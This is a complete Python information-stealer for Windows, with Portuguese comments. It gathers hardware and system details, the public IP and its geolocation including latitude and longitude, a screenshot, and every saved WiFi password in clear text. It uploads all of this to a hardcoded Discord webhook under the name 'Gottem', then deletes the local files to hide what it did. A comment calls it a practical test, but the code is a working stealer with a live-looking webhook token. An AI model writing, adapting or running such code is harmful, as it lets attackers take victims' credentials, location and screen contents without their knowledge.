import time
import requests
import socket
import platform
import pyautogui
import subprocess
import os
import psutil

# Webhook temporário para prova prática
webhook = 'https://discord.com/api/webhooks/1393709097978953888/EMm32ITzOxT4OdyiscqB9ydqoz4GOZxIS0roxZ51TiibpmzGNorHnIrZ3oA_RPQ9VQ7u'

# Get hardware information
cpu = subprocess.check_output('wmic cpu get name', shell=True).decode(errors='ignore').split('\n')[1].strip()
gpu = subprocess.check_output('wmic path win32_VideoController get name', shell=True).decode(errors='ignore').split('\n')[1].strip()
motherboard = subprocess.check_output('wmic baseboard get product', shell=True).decode(errors='ignore').split('\n')[1].strip()
ram = str(round(psutil.virtual_memory().total / (1024.0 **3))) + " GB"
storage = str(round(psutil.disk_usage('/').total / (1024.0 **3))) + " GB"

# Get the user's IP address
ip = requests.get('https://api.my-ip.io/ip').text.strip()

# Check if IP is VPN using proxycheck.io
response = requests.get(f'https://proxycheck.io/v2/{ip}?vpn=1')
ipdata = response.json()
other = str(ipdata.get(ip, {}))

# Save IP details
with open('ip.txt', 'w') as f:
    f.write(other)

# Get geolocation info
geo_response = requests.get(f'http://ip-api.com/json/{ip}')
vpndata = geo_response.json()
country = vpndata.get('country', 'Unknown')
city = vpndata.get('city', 'Unknown')
isp = vpndata.get('isp', 'Unknown')
lat = str(vpndata.get('lat', 'Unknown'))
lon = str(vpndata.get('lon', 'Unknown'))

# Get system info
hostname = socket.gethostname()
platformos = platform.system()
release = platform.release()
version = platform.version()

# Take screenshot
screenshot = pyautogui.screenshot()
screenshot.save('screenshot.png')

# Extract WiFi passwords
wifi_data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles'], shell=True).decode(errors='ignore').split('\n')
profiles = [line.split(":")[1].strip() for line in wifi_data if "All User Profile" in line]
with open('wifi.txt', 'w') as f:
    for profile in profiles:
        try:
            results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', profile, 'key=clear'], shell=True).decode(errors='ignore').split('\n')
            password_line = [line for line in results if "Key Content" in line]
            password = password_line[0].split(":")[1].strip() if password_line else "NO PASSWORD FOUND"
            f.write(f"{profile:<30}|  {password}\n")
        except Exception:
            f.write(f"{profile:<30}|  ERROR\n")

# Send collected info via webhook
def send_webhook(data, file=None):
    if file:
        with open(file, 'rb') as f:
            requests.post(webhook, data=data, files={'file': f})
    else:
        requests.post(webhook, json=data)

# Embed data
embed_base = {
    "username": "Gottem",
    "avatar_url": "https://i.pinimg.com/474x/c9/65/05/c965055e5101140eba23785b04c2822d.jpg"
}

embeds = [
    {
        "title": "System Info",
        "color": 65280,
        "fields": [
            {"name": "Hostname", "value": hostname},
            {"name": "OS", "value": f"{platformos} {release} ({version})"},
            {"name": "CPU", "value": cpu},
            {"name": "GPU", "value": gpu},
            {"name": "Motherboard", "value": motherboard},
            {"name": "RAM", "value": ram},
            {"name": "Storage", "value": storage}
        ]
    },
    {
        "title": "Network Info",
        "color": 65280,
        "fields": [
            {"name": "IP Address", "value": ip},
            {"name": "Country", "value": country},
            {"name": "City", "value": city},
            {"name": "ISP", "value": isp},
            {"name": "Latitude", "value": lat},
            {"name": "Longitude", "value": lon}
        ]
    }
]

# Send embeds
for embed in embeds:
    payload = embed_base.copy()
    payload['embeds'] = [embed]
    send_webhook(payload)
    time.sleep(1)

# Send files
for file_name in ['screenshot.png', 'ip.txt', 'wifi.txt']:
    send_webhook(embed_base, file=file_name)
    time.sleep(1)
    os.remove(file_name)
